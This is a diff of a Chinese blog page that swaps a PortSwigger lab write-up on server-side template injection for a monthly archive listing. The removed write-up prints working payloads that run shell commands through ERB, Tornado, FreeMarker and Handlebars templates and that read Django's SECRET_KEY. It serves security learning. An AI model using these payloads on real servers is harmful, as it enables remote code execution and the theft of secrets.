@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  
-  <link rel="canonical" href="https://fullstack-sake.github.io/blog/ac23f3c6.html"/>
+  <meta name="robots" content="noindex,follow">
+  <link rel="canonical" href="https://fullstack-sake.github.io/archives/2023/03/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -35,19 +35,17 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>PortSwigger-SSTI-Writeup - sake's blog</title>
+  <title>归档：2023/3 - sake's blog</title>
   <meta name="keywords" content="fullstack-sake,fullstacksake,sake,blog">
   <meta desc name="description" content="fullstack-sake's blog - sake - sake's blog">
   
-<meta property="og:type" content="article">
-<meta property="og:title" content="PortSwigger-SSTI-Writeup">
-<meta property="og:url" content="https://fullstack-sake.github.io/blog/ac23f3c6.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="sake&#39;s blog">
+<meta property="og:url" content="https://fullstack-sake.github.io/archives/2023/03/index.html">
 <meta property="og:site_name" content="sake&#39;s blog">
-<meta property="og:description" content="本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。    服务端模板注入是指攻击者能够利用模板自身语法将恶意负载注入模板，然后在服务端执行。 模板引擎被设计成通过结合固定模板和可变数据来生成网页。当用户输入直接拼接到模板中，而不是作为数据传入时，可能会发生服务端模板注入攻击。这使得攻击者能够注入任意模板指令来操纵模板引擎，从而能够完全控制服务器。顾名思义，服">
+<meta property="og:description" content="fullstack-sake&#39;s blog">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2023-01-21T09:26:21.000Z">
-<meta property="article:modified_time" content="2023-02-04T09:01:13.061Z">
 <meta property="article:author" content="sake">
 <meta property="article:tag" content="fullstack-sake,fullstacksake,sake,blog">
 <meta name="twitter:card" content="summary">
@@ -2338,7 +2336,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >  
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >  
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
   <div class='container'>
   <div id='wrapper'>
@@ -2608,7 +2606,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper post dock' style="display: none;">
+      <div id="half" class='cover-wrapper  dock' style="display: ;">
         
   <div id="parallax-window"></div>
 
@@ -2685,8 +2683,22 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="https://fullstack-sake.github.io/blog/ac23f3c6.html">
+	
+		
+  <section class="post-list">
+    
+      
+        
+          
+        
+      
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <link itemprop="mainEntityOfPage" href="https://fullstack-sake.github.io/blog/6d3d97d1.html">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="sake's blog">
   </span>
@@ -2695,458 +2707,77 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="fullstack-sake's blog">
   </span>
   
-
-
+  
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  <div class="article-meta" id="top">
+  
     
+    <h2 class="article-title"  itemprop="name headline">
+      <a href="/blog/6d3d97d1.html"  itemprop="url">
+        【数字图像处理】学习笔记1
+      </a>
+    </h2>
+  
+  <div class='md article-desc' itemprop="articleBody">
     
-    
-      <h1 class="title" itemprop="name headline">
-        PortSwigger-SSTI-Writeup
-      </h1>
-      <div class='new-meta-box'>
-        
-          
-            
-<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <a itemprop="url" class='author' href="/" rel="nofollow">
-    <img itemprop="image" src="https://avatars.githubusercontent.com/u/64351788" class="lazyload" data-srcset="https://avatars.githubusercontent.com/u/64351788" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-    <p itemprop="name">sake</p>
-  </a>
-</div>
-
-          
-        
-          
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-01-21T17:26:21+08:00">
-  <a class='notlink'>
-    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2023年1月21日</p>
-  </a>
-</div>
-
-          
-        
-          
-            <div class="new-meta-item date" itemprop="dateModified" datetime="2023-02-04T17:01:13+08:00">
-  <a class='notlink'>
-    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2023年2月4日</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  <div class="new-meta-item wordcount">
-    <a class='notlink'>
-      <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1.5k 字</p>
-    </a>
-  </div>
-  <div class="new-meta-item readtime">
-    <a class='notlink'>
-      <i class="fa-solid fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：5 分钟</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-
-          
-        
-          
-            
-
-
-<div class="new-meta-item browse">
-  <a class='notlink'>
-    <p>
-      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
       
-      <span id="busuanzi_value_page_pv">
-        <i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i>
-      </span>
         
-      <span>次浏览</span>
-    </p>
-  </a>
-</div>
+本系列的数学复杂性处于大学高年级本科生和一年级硕士研究生的水平，读者应先修了数学分析、向量、矩阵、概率、统计、线性系统和计算机编程等课程。
 
-
+ [1.1]什么是数字图像处理
+数字图像: 定义为一个二维函数f(x,y)f(x,y)f(x,y)，其中x, y是空间（平面）坐标，任一(x,y)(x,y)(x,y)处的幅值称为图像在该点的强度或灰度。当x, y, 灰度值为有限的离散量时，称为数字图...
+      
+    
+  </div>
+  
+    <div class='meta-v3' line_style='dotted'>
+      <div>
+        
+          
+          <a class='avatar' href='/'><img src='https://avatars.githubusercontent.com/u/64351788'></a>
+          <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+            <meta itemprop="image" content="https://avatars.githubusercontent.com/u/64351788">
+            <meta itemprop="name" content="sake">
+            <meta itemprop="url" content="/">
+          </span>
+        
+        <time itemprop="dateCreated datePublished" datetime="2023-03-12T10:38:14+08:00">2023-03-12</time>
+        
+          <span class="dot"></span>
+          <a class="category-link" href="/categories/Tech/">Tech</a>
+          
+            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+              <a href="/categories/Tech/" itemprop="url"><span itemprop="name">Tech</span></a>
+            </span>
           
         
-          
-            
-
-          
-        
-        <!-- Custom Files topMeta begin-->
-        
-        <!-- Custom Files topMeta end-->
       </div>
-    
-  </div>
-
-
-  <div id="layoutHelper-page-plugins"></div>
-  <div id="post-body" itemprop="articleBody">
-    <blockquote>
-<p><strong>本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。</strong></p>
-</blockquote>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121195535830.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121195535830.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121195535830" /></p>
-<blockquote>
-<p>服务端模板注入是指攻击者能够利用模板自身语法将恶意负载注入模板，然后在服务端执行。</p>
-<p>模板引擎被设计成通过结合固定模板和可变数据来生成网页。当用户输入直接拼接到模板中，而不是作为数据传入时，可能会发生服务端模板注入攻击。这使得攻击者能够注入任意模板指令来操纵模板引擎，从而能够完全控制服务器。顾名思义，服务端模板注入有效负载是在服务端交付和执行的，这可能使它们比典型的客户端模板注入更危险。</p>
-</blockquote>
-<blockquote>
-<p>服务端模板注入漏洞会使网站面临各种攻击，具体取决于所讨论的模板引擎以及应用程序如何使用它。在极少数情况下，这些漏洞不会带来真正的安全风险。然而，大多数情况下，服务端模板注入的影响可能是灾难性的。</p>
-<p>最严重的情况是，攻击者有可能完成远程代码执行，从而完全控制后端服务器，并利用它对内部基础设施进行其他攻击。</p>
-<p>即使在不可能完全执行远程代码的情况下，攻击者通常仍可以使用服务端模板注入作为许多其他攻击的基础，从而可能获得服务器上敏感数据和任意文件的访问权限。</p>
-<p>当用户输入直接拼接到模板中而不是作为数据传入时，就会出现服务端模板注入漏洞。</p>
-</blockquote>
-<h2 id="basic-server-side-template-injection"><a class="markdownIt-Anchor" href="#basic-server-side-template-injection"></a> Basic server-side template injection</h2>
-<p>靶场要求：</p>
-<blockquote>
-<p>由于ERB模板的不安全构造，此实验室容易受到服务器端模板注入的影响。<br />
-要解决这个问题，请查看ERB文档，了解如何执行任意代码，然后从Carlos的主目录中删除morale.txt文件。</p>
-</blockquote>
-<p>实验步骤：</p>
-<p>随便点击一个商品详细，请求的message可控，且能回显到页面上，目标注入点就在这里</p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121201829437.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121201829437.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121201829437" /></p>
-<p>先去官方文档了解一下RUBY的<a target="_blank" rel="noopener" href="https://docs.ruby-lang.org/en/master/ERB.html">ERB模板</a>，可以看到**&lt;%= Ruby expression – replace with result %&gt;**表示该格式可以内嵌表达式</p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121202308832.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121202308832.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121202308832" /></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121202402896.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121202402896.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121202402896" /></p>
-<p>再查一下RUBY如何执行shell命令，使用exec和system均可，区别是：<strong>exec会替换当前进程，system返回执行结果(布尔值)</strong></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121204039682.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121204039682.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121204039682" /></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121204108869.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121204108869.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121204108869" /></p>
-<p>于是我们在修改message请求内容为<code>&lt;%= system 'ls' %&gt;</code>，查看目录下文件列表<img src="../image/PortSwigger-SSTI-Writeup/image-20230121204729823.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121204729823.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121204729823" /></p>
-<p>接着修改为<code>&lt;%= system 'rm morale.txt' %&gt;</code>，删除moral.txt文件</p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121205034621.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121205034621.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121205034621" /></p>
-<h2 id="basic-server-side-template-injection-code-context"><a class="markdownIt-Anchor" href="#basic-server-side-template-injection-code-context"></a> Basic server-side template injection (code context)</h2>
-<p>靶场要求：</p>
-<blockquote>
-<p>由于使用Tornado模板的方式不安全，该实验室容易受到服务器端模板注入的影响。要解决这个问题，请查看Tornado文档，了解如何执行任意代码，然后从Carlos的主目录中删除morale.txt文件。<br />
-您可以使用以下凭据登录到自己的帐户：wiener:peter</p>
-</blockquote>
-<p>实验步骤：</p>
-<p>登录用户，然后抓取提交<strong>Preferred name</strong>的数据包，发现是通过一个POST请求设置<code>blog-post-author-display</code>字段的参数，取值为：<code>user.name</code>，<code>user.first_name</code>或<code>user.nickname</code></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121212356539.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121212356539.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121212356539" /></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121212310205.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121212310205.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121212310205" /></p>
-<p>通过阅读Tornado文档中<a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/template.html#">template</a>的用法，我们了解到模板表达式被双花括号包围: <code>&#123;&#123; python expression &#125;&#125;</code>，然后转义并且插入到输出</p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121213025258.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121213025258.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121213025258" /></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121213314589.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121213314589.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121213314589" /></p>
-<p>于是我们将<code>blog-post-author-display=user.name</code>修改为<code>blog-post-author-display=user.name&#125;&#125;&#123;&#123;7*7`，再打开随便一篇文章，在文章评论区评论，将昵称回显出来。发现页面返回了49，确实存在模板注入
-
-![image-20230121214406213](../image/PortSwigger-SSTI-Writeup/image-20230121214406213.png)
-
-接着我们利用双花括号包围的python表达式构建shell命令（详细见上文提到的[语法参考](https://tornado-zh.readthedocs.io/zh/latest/template.html#id1)），将`blog-post-author-display=user.name`改为`blog-post-author-display=user.name&#125;&#125;&#123;&#123;__import__("os").popen("ls").read()`，再次查看评论区回显
-
-![image-20230121215425444](../image/PortSwigger-SSTI-Writeup/image-20230121215425444.png)
-
-最后执行删除moral.txt文件的命令（修改为`blog-post-author-display=user.name&#125;&#125;&#123;&#123;__import__("os").popen("rm morale.txt").read()`）就成功解决了Lab
-
-![image-20230121215722468](../image/PortSwigger-SSTI-Writeup/image-20230121215722468.png)
-
-## Server-side template injection using documentation
-
-靶场要求：
-
-> 此实验室易受服务器端模板注入的影响。要解决这个问题，请确定模板引擎并使用文档来确定如何执行任意代码，然后从Carlos的主目录中删除morale.txt文件。
-> 您可以使用以下凭据登录到自己的帐户：`content-manager:C0nt3ntM4n4g3r`
-
-实验步骤：
-
-登录用户，编辑模板，直接给了模板注入的一个测试页面，还支持预览
-
-![image-20230121221153611](../image/PortSwigger-SSTI-Writeup/image-20230121221153611.png)
-
-通过查阅freemarker的文档，发现有对[模板的上传安全性](http://freemarker.foofun.cn/app_faq.html#faq_template_uploading_security)进行说明，提到了**虽然new不会实例化不是TemplateModel-s的类，但FreeMarker包含一个TemplateModel类，可用于创建任意Java对象**。
-
-![image-20230121221028401](../image/PortSwigger-SSTI-Writeup/image-20230121221028401.png)
-
-查阅官方文档对[new函数](http://freemarker.foofun.cn/ref_builtins_expert.html#ref_builtin_new)的描述，我们可以通过**freemarker.template.utility**的**Execute**类来执行shell命令
-
-![image-20230121221556207](../image/PortSwigger-SSTI-Writeup/image-20230121221556207.png)
-
-`<#assign test="freemarker.template.utility.Execute"?new()>$&#123;test("ls")&#125;`
-
-![image-20230121222227366](../image/PortSwigger-SSTI-Writeup/image-20230121222227366.png)
-
-`<#assign test="freemarker.template.utility.Execute"?new()>$&#123;test("ls")&#125;`
-
-![image-20230121222440470](../image/PortSwigger-SSTI-Writeup/image-20230121222440470.png)
-
-## Server-side template injection in an unknown language with a documented exploit
-
-靶场要求：
-
-> 此实验室易受服务器端模板注入的影响。要解决实验室问题，请识别模板引擎并在线查找可用于执行任意代码的漏洞，然后从Carlos的主目录中删除morale.txt文件。
-
-实验步骤：
-
-随便点击一个商品详细，请求的message可控，且能回显到页面上，目标注入点就在这里，尝试提交`$&#123;&#123;<%[%'"&#125;&#125;%\</code>fuzz测试一下，回显报错显示使用的是<strong>handlebars</strong></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121223137509.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121223137509.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121223137509" /></p>
-<p>在网上找到一份<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4695">POC</a>：</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> <span class="token string">"s"</span> <span class="token keyword">as</span> <span class="token operator">|</span>string<span class="token operator">|</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> <span class="token string">"e"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> split <span class="token keyword">as</span> <span class="token operator">|</span>conslist<span class="token operator">|</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">push</span> <span class="token punctuation">(</span>lookup string<span class="token punctuation">.</span>sub <span class="token string">"constructor"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> string<span class="token punctuation">.</span>split <span class="token keyword">as</span> <span class="token operator">|</span>codelist<span class="token operator">|</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>push <span class="token string">"return JSON.stringify(process.env);"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#each conslist<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-          <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>sub<span class="token punctuation">.</span>apply <span class="token number">0</span> codelist<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-          <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span>each<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>稍加修改，然后再urlencode之后请求一下就成功删除morale.txt</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> <span class="token string">"s"</span> <span class="token keyword">as</span> <span class="token operator">|</span>string<span class="token operator">|</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> <span class="token string">"e"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> split <span class="token keyword">as</span> <span class="token operator">|</span>conslist<span class="token operator">|</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">push</span> <span class="token punctuation">(</span>lookup string<span class="token punctuation">.</span>sub <span class="token string">"constructor"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> string<span class="token punctuation">.</span>split <span class="token keyword">as</span> <span class="token operator">|</span>codelist<span class="token operator">|</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>push <span class="token string">"return require('child_process').exec('rm /home/carlos/morale.txt');"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#each conslist<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-          <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>#<span class="token keyword">with</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>sub<span class="token punctuation">.</span>apply <span class="token number">0</span> codelist<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-          <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span>each<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-      <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121224629671.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121224629671.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121224629671" /></p>
-<h2 id="server-side-template-injection-with-information-disclosure-via-user-supplied-objects"><a class="markdownIt-Anchor" href="#server-side-template-injection-with-information-disclosure-via-user-supplied-objects"></a> Server-side template injection with information disclosure via user-supplied objects</h2>
-<p>靶场要求：</p>
-<blockquote>
-<p>由于对象传递到模板中的方式，此实验室容易受到服务器端模板注入的影响。可利用此漏洞访问敏感数据。<br />
-要解决实验室问题，请窃取并提交框架的密钥。<br />
-您可以使用以下凭据登录到自己的帐户：<code>content-manager:C0nt3ntM4n4g3r</code></p>
-</blockquote>
-<p>实验步骤：</p>
-<p>登录用户，编辑模板，直接给了模板注入的一个测试页面，还支持预览，尝试提交<code>$&#123;&#123;<%[%'"&#125;&#125;%\</code>fuzz测试一下，回显报错显示使用的是<strong>django</strong></p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121225512454.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121225512454.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121225512454" /></p>
-<p>学习<a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/4.1/">Django文档</a>，调用debug内置函数：<code>&#123;% debug %&#125;</code>，返回此模板内访问的对象和属性的列表</p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121230125056.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121230125056.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121230125056" /></p>
-<p>研究官方文档中关于<a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/4.1/ref/settings">settings</a>的描述，其中含有的SECRET_KEY属性正是我们要窃取的密钥</p>
-<p><img src="../image/PortSwigger-SSTI-Writeup/image-20230121231014081.png" class="lazyload" data-srcset="../image/PortSwigger-SSTI-Writeup/image-20230121231014081.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230121231014081" /></p>
-<p>直接用<code>&#123;&#123;settings.SECRET_KEY&#125;&#125;</code>读出secret_key的值，提交密钥即可</p>
